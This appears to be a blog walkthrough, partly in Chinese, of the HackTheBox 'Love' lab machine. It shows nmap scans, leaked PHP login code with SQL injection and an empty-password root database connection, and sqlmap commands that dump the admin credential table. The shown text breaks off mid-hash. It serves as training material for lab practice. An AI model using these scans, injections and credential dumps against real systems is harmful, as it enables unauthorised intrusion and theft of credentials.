<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">
<meta name="referrer" content="no-referrer" />
  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_icon.svg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_icon.svg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_icon.svg">
  <link rel="mask-icon" href="/images/logo_icon.svg" color="#222">
  <link rel="manifest" href="/images/logo_icon.svg">
  <meta name="msapplication-config" content="/images/logo_icon.svg">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=consolas:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoloyolo.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="The more knowledge you drink, the more thirsty you are.">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox_Windows_Set_0">
<meta property="og:url" content="https://yoloyolo.top/2021/06/09/HackTheBox-Windows-Set-0/index.html">
<meta property="og:site_name" content="xXxYOLOxXx">
<meta property="og:description" content="The more knowledge you drink, the more thirsty you are.">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2021-06-09T09:20:32.000Z">
<meta property="article:modified_time" content="2023-03-09T17:25:19.733Z">
<meta property="article:author" content="xXxYOLOxXx">
<meta property="article:tag" content="Pentest">
<meta property="article:tag" content="HackTheBox">
<meta property="article:tag" content="Windows">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://yoloyolo.top/2021/06/09/HackTheBox-Windows-Set-0/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>HackTheBox_Windows_Set_0 | xXxYOLOxXx</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="xXxYOLOxXx" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">xXxYOLOxXx</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">xXxYOLOxXx</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="links fa-fw"></i>Links</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://yoloyolo.top/2021/06/09/HackTheBox-Windows-Set-0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="xXxYOLOxXx">
      <meta itemprop="description" content="Explorer for unknown.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xXxYOLOxXx">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HackTheBox_Windows_Set_0
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-06-09 17:20:32" itemprop="dateCreated datePublished" datetime="2021-06-09T17:20:32+08:00">2021-06-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-10 01:25:19" itemprop="dateModified" datetime="2023-03-10T01:25:19+08:00">2023-03-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Study/" itemprop="url" rel="index"><span itemprop="name">Study</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>The more knowledge you drink, the more thirsty you are.</p>
<a id="more"></a>
<h1 id="hackthebox_love"><a class="markdownIt-Anchor" href="#hackthebox_love"></a> HackTheBox_love</h1>
<h2 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.239</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.239</span><br><span class="line">Host is up (0.87s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3306-TCP:V=7.91%I=7%D=6/9%Time=60C04557%P=x86_64-pc-linux-gnu%r(NUL</span><br><span class="line">SF:L,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed</span></span><br><span class="line"><span class="string">SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(GenericLines,4</span><br><span class="line">SF:9,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x2</span></span><br><span class="line"><span class="string">SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(HTTPOptions,49,<span class="string">&quot;E</span></span><br><span class="line"><span class="string">SF:\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\</span></span><br><span class="line"><span class="string">SF:x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(RPCCheck,49,<span class="string">&quot;E\0\0\x0</span></span><br><span class="line"><span class="string">SF:1\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20conn</span></span><br><span class="line"><span class="string">SF:ect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(DNSStatusRequestTCP,49,<span class="string">&quot;E\0\</span></span><br><span class="line"><span class="string">SF:0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20</span></span><br><span class="line"><span class="string">SF:connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(TerminalServerCookie,49,</span><br><span class="line">SF:<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20t</span></span><br><span class="line"><span class="string">SF:o\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(Kerberos,49,<span class="string">&quot;E\0\0\</span></span><br><span class="line"><span class="string">SF:x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20co</span></span><br><span class="line"><span class="string">SF:nnect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(X11Probe,49,<span class="string">&quot;E\0\0\x01\xff</span></span><br><span class="line"><span class="string">SF:j\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x</span></span><br><span class="line"><span class="string">SF:20to\x20this\x20MariaDB\x20server&quot;</span>)%r(FourOhFourRequest,49,<span class="string">&quot;E\0\0\x01\x</span></span><br><span class="line"><span class="string">SF:ffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect</span></span><br><span class="line"><span class="string">SF:\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(LDAPSearchReq,49,<span class="string">&quot;E\0\0\x01\xff</span></span><br><span class="line"><span class="string">SF:j\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x</span></span><br><span class="line"><span class="string">SF:20to\x20this\x20MariaDB\x20server&quot;</span>)%r(LDAPBindReq,49,<span class="string">&quot;E\0\0\x01\xffj\x0</span></span><br><span class="line"><span class="string">SF:4Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to</span></span><br><span class="line"><span class="string">SF:\x20this\x20MariaDB\x20server&quot;</span>)%r(SIPOptions,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host</span></span><br><span class="line"><span class="string">SF:\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20t</span></span><br><span class="line"><span class="string">SF:his\x20MariaDB\x20server&quot;</span>)%r(TerminalServer,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\</span></span><br><span class="line"><span class="string">SF:x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20th</span></span><br><span class="line"><span class="string">SF:is\x20MariaDB\x20server&quot;</span>)%r(NCP,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.</span></span><br><span class="line"><span class="string">SF:16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaD</span></span><br><span class="line"><span class="string">SF:B\x20server&quot;</span>)%r(JavaRMI,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x</span></span><br><span class="line"><span class="string">SF:20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20ser</span></span><br><span class="line"><span class="string">SF:ver&quot;</span>);</span><br><span class="line">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 443 10.10.10.239</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.239</span><br><span class="line">Host is up (0.75s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=<span class="keyword">in</span></span><br><span class="line">| Not valid before: 2021-01-18T14:00:16</span><br><span class="line">|_Not valid after:  2022-01-18T14:00:16</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (95%), Microsoft Windows Longhorn (95%), Microsoft Windows 10 1703 (93%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows 7 SP1 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 10 1709 - 1803 (93%), Microsoft Windows 10 1809 - 1909 (93%), Microsoft Windows 10 1511 (92%), Microsoft Windows Server 2008 SP2 (92%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Hosts: www.example.com, www.love.htb</span><br></pre></td></tr></table></figure>
<p>这里需要对SSL端口进行更加详细的扫描才能得到域名<code>staging.love.htb</code><br />
不使用域名访问443端口则会被403<br />
5000端口则是直接403</p>
<h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2>
<p>用域名访问443端口可以看到一个LFI漏洞<br />
file协议读取即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">#C:\xampp\htdocs\omrs\login.php</span></span><br><span class="line">	session_start();</span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;includes/conn.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$voter</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;voter&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM voters WHERE voters_id = &#x27;<span class="subst">$voter</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$query</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$query</span>-&gt;num_rows &lt; <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Cannot find voter with the ID&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$row</span> = <span class="variable">$query</span>-&gt;fetch_assoc();</span><br><span class="line">			<span class="keyword">if</span>(password_verify(<span class="variable">$password</span>, <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;voter&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Incorrect password&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Input voter credentials first&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	header(<span class="string">&#x27;location: index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">#C:\xampp\htdocs\omrs\admin\includes\conn.php</span></span><br><span class="line">	<span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;votesystem&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">	    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">#C:\xampp\htdocs\omrs\admin\login.php</span></span><br><span class="line">	session_start();</span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;includes/conn.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$query</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$query</span>-&gt;num_rows &lt; <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Cannot find account with the username&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$row</span> = <span class="variable">$query</span>-&gt;fetch_assoc();</span><br><span class="line">			<span class="keyword">if</span>(password_verify(<span class="variable">$password</span>, <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Incorrect password&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Input admin credentials first&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	header(<span class="string">&#x27;location: index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">#C:\xampp\htdocs\omrs\admin\includes\conn.php</span></span><br><span class="line">	<span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;votesystem&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">	    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>明显地存在SQL注入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/login.php&quot;</span> -data <span class="string">&quot;voter=123&amp;password=321&amp;login=&quot;</span> --dbs</span><br><span class="line">available databases [6]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] phpmyadmin</span><br><span class="line">[*] <span class="built_in">test</span></span><br><span class="line">[*] votesystem</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem --tables</span><br><span class="line">Database: votesystem</span><br><span class="line">[5 tables]</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">| candidates |</span><br><span class="line">| positions  |</span><br><span class="line">| voters     |</span><br><span class="line">| votes      |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T admin --columns</span><br><span class="line">Database: votesystem</span><br><span class="line">Table: admin</span><br><span class="line">[7 columns]</span><br><span class="line">+------------+--------------+</span><br><span class="line">| Column     | Type         |</span><br><span class="line">+------------+--------------+</span><br><span class="line">| created_on | date         |</span><br><span class="line">| firstname  | varchar(50)  |</span><br><span class="line">| id         | int(11)      |</span><br><span class="line">| lastname   | varchar(50)  |</span><br><span class="line">| password   | varchar(60)  |</span><br><span class="line">| photo      | varchar(150) |</span><br><span class="line">| username   | varchar(50)  |</span><br><span class="line">+------------+--------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T admin -C username, password --dump</span><br><span class="line">Database: votesystem</span><br><span class="line">Table: admin</span><br><span class="line">[1 entry]</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| username | password                                                     |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| admin    | $2y$10<span 